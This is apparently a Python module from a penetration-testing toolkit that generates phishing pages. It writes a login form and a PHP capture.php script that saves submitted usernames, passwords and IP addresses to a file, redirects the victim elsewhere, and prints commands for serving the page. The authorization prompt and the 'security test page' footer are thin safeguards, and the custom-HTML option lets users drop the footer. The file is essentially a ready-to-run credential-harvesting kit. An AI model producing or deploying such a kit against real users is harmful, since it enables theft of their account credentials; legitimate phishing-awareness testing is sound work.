#!/usr/bin/env python3
"""
PENTRA-X Phishing Page Generator
Create simple phishing pages for authorized testing.
"""

import os
from pathlib import Path
from typing import Optional

from ...core.colors import Colors, success, error, info, warning, header
from ...core.utils import safe_input, safe_press_enter
from ...core.logging import get_logger, log_result


# Page templates
TEMPLATES = {
    'login': '''<!DOCTYPE html>
<html>
<head>
    <title>{title}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .container {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; }}
        h2 {{ text-align: center; color: #1877f2; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background: #166fe5; }}
        .footer {{ text-align: center; margin-top: 15px; color: #666; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>{prompt}</h2>
        <form method="POST" action="capture.php">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p class="footer">This is a security test page</p>
    </div>
</body>
</html>''',
    
    'capture_php': '''<?php
$logfile = 'captured.txt';
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

$data = "[$time] IP: $ip | User: $username | Pass: $password\\n";
file_put_contents($logfile, $data, FILE_APPEND);

// Redirect to real site
header('Location: https://example.com');
exit;
?>''',
}


def phishing_page_generator() -> Optional[str]:
    """
    Generate a phishing page for authorized testing.
    
    Returns:
        Path to generated page or None
    """
    logger = get_logger()
    
    header("Phishing Page Generator")
    
    warning("FOR AUTHORIZED TESTING ONLY!")
    warning("Unauthorized phishing is ILLEGAL!")
    
    # Confirm authorization
    confirm = safe_input(f"{Colors.FAIL}Type 'AUTHORIZED' to confirm legal use: {Colors.ENDC}")
    if confirm != 'AUTHORIZED':
        info("Operation cancelled")
        safe_press_enter()
        return None
    
    # Get page details
    print(f"\n{Colors.OKCYAN}Page Options:{Colors.ENDC}")
    print(f"  {Colors.OKCYAN}1.{Colors.ENDC} Generic login page")
    print(f"  {Colors.OKCYAN}2.{Colors.ENDC} Custom template")
    
    choice = safe_input(f"\n{Colors.OKGREEN}Select option: {Colors.ENDC}") or '1'
    
    output_dir = safe_input(f"{Colors.OKGREEN}Output directory (default: ./phish_page): {Colors.ENDC}")
    output_dir = output_dir.strip() if output_dir else './phish_page'
    
    logger.tool_start("Phishing Page Gen", output_dir)
    
    try:
        # Create directory
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        
        if choice == '1':
            title = safe_input(f"{Colors.OKGREEN}Page title (default: Login): {Colors.ENDC}") or 'Login'
            prompt = safe_input(f"{Colors.OKGREEN}Form prompt (default: Please sign in): {Colors.ENDC}") or 'Please sign in'
            
            html = TEMPLATES['login'].format(title=title, prompt=prompt)
            
        elif choice == '2':
            print(f"\n{Colors.OKCYAN}Paste custom HTML (end with 'END' on a new line):{Colors.ENDC}")
            lines = []
            while True:
                line = input()
                if line.strip() == 'END':
                    break
                lines.append(line)
            html = '\n'.join(lines)
        else:
            title = 'Login'
            prompt = 'Please sign in'
            html = TEMPLATES['login'].format(title=title, prompt=prompt)
        
        # Save files
        index_path = Path(output_dir) / 'index.html'
        with open(index_path, 'w') as f:
            f.write(html)
        
        capture_path = Path(output_dir) / 'capture.php'
        with open(capture_path, 'w') as f:
            f.write(TEMPLATES['capture_php'])
        
        print(f"\n{Colors.OKCYAN}Files created:{Colors.ENDC}")
        print(f"  {index_path}")
        print(f"  {capture_path}")
        
        print(f"\n{Colors.OKCYAN}To serve locally:{Colors.ENDC}")
        print(f"  cd {output_dir}")
        print(f"  python3 -m http.server 80")
        print(f"  # Or use PHP: php -S 0.0.0.0:80")
        
        success(f"Phishing page generated in {output_dir}")
        
        log_result("phishing_page", f"Generated: {output_dir}")
        logger.tool_end("Phishing Page Gen", success=True)
        
        safe_press_enter()
        return str(output_dir)
        
    except Exception as e:
        error(f"Generation failed: {e}")
        logger.tool_end("Phishing Page Gen", success=False)
        safe_press_enter()
        return None


if __name__ == "__main__":
    phishing_page_generator()
